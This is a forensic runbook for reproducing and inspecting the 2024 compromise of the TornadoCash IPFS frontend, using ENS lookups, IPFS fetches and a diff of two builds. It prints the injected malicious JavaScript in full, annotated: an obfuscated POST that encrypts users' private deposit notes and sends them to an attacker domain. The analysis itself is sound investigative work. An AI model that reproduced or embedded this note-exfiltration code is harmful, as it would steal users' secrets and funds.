# TornadoCash gov / ipfs pwn review

In early 2024, when TornadoCash was still [notorious and sanctioned](https://home.treasury.gov/news/press-releases/jy0916), it also got hacked. The official IPFS-served, [ENS-registered](https://etherscan.io/tx/0xd0702bce5e0608d042c7673bc382a605f7eb94dd354c36c56220b4238c1ab0d1/advanced#eventlog) frontend for `tornadocash.eth` exfiltrated private notes from users during deposit time for ~2 months.

This runbook let's you validate and understand the exploit in the verified IPFS frontend payloads. You fetch the required files from two TornadoCash frontend builds (onchain proposals 44 and 52) from a local IPFS node, prettify the bundled JavaScript, and spot the malicious diff.

## 1. Resolve the CIDs from an archive Ethereum RPC

Proposal 44 changed `tornadocash.eth` to the malicious CID. Proposal 52 restored a clean CID. The ENS resolver was `0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41`, and the namehash for `tornadocash.eth` is `0xe6ae31d630cc7a8279c0f1c7cbe6e7064814c47d1785fa2703d9ae511ee2be0c`.

```sh
export ETH_RPC_URL="https://eth.drpc.org"
export RESOLVER="0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41"
export NODE="0xe6ae31d630cc7a8279c0f1c7cbe6e7064814c47d1785fa2703d9ae511ee2be0c"

# Proposal 44 execution block 18919337, tx 0xd0702bce5e0608d042c7673bc382a605f7eb94dd354c36c56220b4238c1ab0d1
export PROP44_CONTENTHASH="$(cast call --block 18919337 "$RESOLVER" 'contenthash(bytes32)(bytes)' "$NODE")"

# Proposal 52 execution block 19432970, tx 0x4fb9cbe37f0f44a5f8da248649481c42607601b37b60fff1017fdebb0c85f1da
export PROP52_CONTENTHASH="$(cast call --block 19432970 "$RESOLVER" 'contenthash(bytes32)(bytes)' "$NODE")"
```

ENS contenthash wraps the CID bytes with the `ipfs-ns` multicodec prefix `0xe301`. For these builds the CID bytes are `0x01701220 || <32-byte sha2-256 digest>`, where `0x01` is CIDv1, `0x70` is dag-pb, `0x12` is sha2-256, and `0x20` is the 32-byte digest length.

```sh
cid_from_contenthash() {
  h="${1#0x}"
  h="${h#e301}"
  printf 'b%s\n' "$(printf '%s' "$h" | xxd -r -p | base32 | tr -d '=' | tr 'A-Z' 'a-z')"
}

export COMPROMISED_CID="$(cid_from_contenthash "$PROP44_CONTENTHASH")"
export CLEAN_CID="$(cid_from_contenthash "$PROP52_CONTENTHASH")"
printf '%s\n%s\n' "$COMPROMISED_CID" "$CLEAN_CID"
```

Expected CIDs:

```text
bafybeiahmpy4e3p4ao2sqqxc2kb4htwl3oklsjncz2are6vnljecmdgmou
bafybeib4rg5gx7plrvzasrrqa3tcb3tnzm2goxhteaxsbem6hjpzsgihbu
```

## 2. Fetch the required files from local IPFS

```sh
export IPFS_GATEWAY="http://127.0.0.1:8080"

mkdir -p /tmp/tornado-ipfs-audit
cd /tmp/tornado-ipfs-audit
mkdir -p compromised/_nuxt clean/_nuxt

curl -fsS "$IPFS_GATEWAY/ipfs/$COMPROMISED_CID/index.html" -o compromised/index.html
curl -fsS "$IPFS_GATEWAY/ipfs/$CLEAN_CID/index.html" -o clean/index.html

curl -fsS "$IPFS_GATEWAY/ipfs/$COMPROMISED_CID/_nuxt/3ec552e.js" -o compromised/_nuxt/3ec552e.js
curl -fsS "$IPFS_GATEWAY/ipfs/$CLEAN_CID/_nuxt/8a72077.js" -o clean/_nuxt/8a72077.js

curl -fsS "$IPFS_GATEWAY/ipfs/$COMPROMISED_CID/_nuxt/b9a598a.js" -o compromised/_nuxt/b9a598a.js
curl -fsS "$IPFS_GATEWAY/ipfs/$CLEAN_CID/_nuxt/2d14009.js" -o clean/_nuxt/2d14009.js

curl -fsS "$IPFS_GATEWAY/ipfs/$COMPROMISED_CID/_nuxt/LICENSES" -o compromised/_nuxt/LICENSES
curl -fsS "$IPFS_GATEWAY/ipfs/$CLEAN_CID/_nuxt/LICENSES" -o clean/_nuxt/LICENSES
```

## 3. Format the changed bundles

Prettify copies only:

```sh
mkdir -p pretty
cp clean/_nuxt/8a72077.js pretty/clean-app.js
cp compromised/_nuxt/3ec552e.js pretty/compromised-app.js
cp clean/_nuxt/2d14009.js pretty/clean-vendor.js
cp compromised/_nuxt/b9a598a.js pretty/compromised-vendor.js

pnpm dlx prettier@2.8.8 --parser babel --write \
  pretty/clean-app.js pretty/compromised-app.js \
  pretty/clean-vendor.js pretty/compromised-vendor.js
```

If Prettier is already installed, `prettier --parser babel --write ...` is fine too!

## 4. Diff and spot the malicious code

Diff the prettified files, then search the app diff:

```sh
diff -u pretty/clean-app.js pretty/compromised-app.js > app.pretty.diff || true
diff -u pretty/clean-vendor.js pretty/compromised-vendor.js > vendor.pretty.diff || true
diff -u clean/_nuxt/LICENSES compromised/_nuxt/LICENSES > licenses.diff || true

AES_KEY='qcdefghijklmnopq' # AES-CTR key material
FETCH_CODES='102, 101, 116, 99, 104' # fetch
URL_CODES='104, 116, 116, 112, 115, 58, 47, 47' # https://gas-oracle.nomevexplorer.com/
POST_CODES='80, 79, 83, 84' # POST
MARKER_CODES='50, 100, 49, 56, 49, 98, 57, 100' # 2d181b9d08f847d634788458 marker prefix
CALLDATA_FIELD='calldata: J()' # field sent in the exfiltration POST body
```

The malicious part of the diff sends an obfuscated POST with the tornadocash note to the exfiltration URL. For obfuscation, mainly `String.fromCharCode` is used and the note is AES encrypted with a hardcoded key before being sent to the supposedly attacker-controlled domain. The normal deposit transaction flow follows right afterwards. If the deposit transaction succeeds, the attacker can immediately withdraw using the exfiltrated note.

```sh
rg -n -C 18 \
  -e "$AES_KEY" \
  -e "$FETCH_CODES" \
  -e "$URL_CODES" \
  -e "$POST_CODES" \
  -e "$MARKER_CODES" \
  -e "$CALLDATA_FIELD" \
  app.pretty.diff
```

Expected code snippet, with comments added:

```js
// Values set earlier in this deposit action:
// N = o.note                                      private note
// j = o.prefix                                    note prefix
// data = S.methods.deposit(...).encodeABI()       real deposit calldata

try {
  (Z = String(A).toLowerCase()),
    (a = Number(z)),
    (K = Number(O)),
    (("eth" === Z && 100 === a && 1 === K) ||
      ("dai" === Z && 1e5 === a && 1 === K) ||
      ("bnb" === Z && 100 === a) ||
      ("wbtc" === Z && 5 === K && 1 === a)) &&
      ((J = function () {
        var e = "qcdefghijklmnopq" // AES-CTR key material.
            .split("")
            .map(function (e, i, t) {
              return t.join("").charCodeAt(i) - "a".charCodeAt(0);
            }),
          t = new D.a.ModeOfOperation.ctr(e); // AES-CTR encryptor

        return (
          data + // real deposit calldata (benign)
          String.fromCharCode.apply(String, [
            50, 100, 49, 56, 49, 98, 57, 100, 48, 56, 102, 56, 52, 55, 100,
            54, 51, 52, 55, 56, 56, 52, 53, 56,
          ]) + // "2d181b9d08f847d634788458" marker
          D.a.utils.hex.fromBytes( // encrypted bytes to hex
            t.encrypt( // AES-CTR encrypt
              D.a.utils.utf8.toBytes( // string to UTF-8 bytes
                // "<note prefix without 'tornado'>-<private note>" 🚨 CONTAINS PRIVATE NOTE N 🚨
                "".concat(j.replace("tornado-", ""), "-").concat(N),
              ),
            ),
          )
        );
      }),
      window[
        String.fromCharCode.apply(String, [102, 101, 116, 99, 104]) // "fetch"
      ](
        String.fromCharCode.apply(String, [
          104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 115, 45, 111, 114, 97,
          99, 108, 101, 46, 110, 111, 109, 101, 118, 101, 120, 112, 108, 111,
          114, 101, 114, 46, 99, 111, 109, 47,
        ]), // "https://gas-oracle.nomevexplorer.com/" - exfiltration URL
        {
          method: String.fromCharCode.apply(String, [80, 79, 83, 84]), // "POST"
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            from: Q,
            to: S._address,
            value: B,
            chain: Number(O),
            calldata: J(), // real calldata + marker + AES-CTR encrypted note
          }),
        },
      ));
} catch (e) {}
return v("metamask/sendTransaction", V, { root: true }); 
// normal wallet tx continues (deposit must succeed for the note to be usable)
```

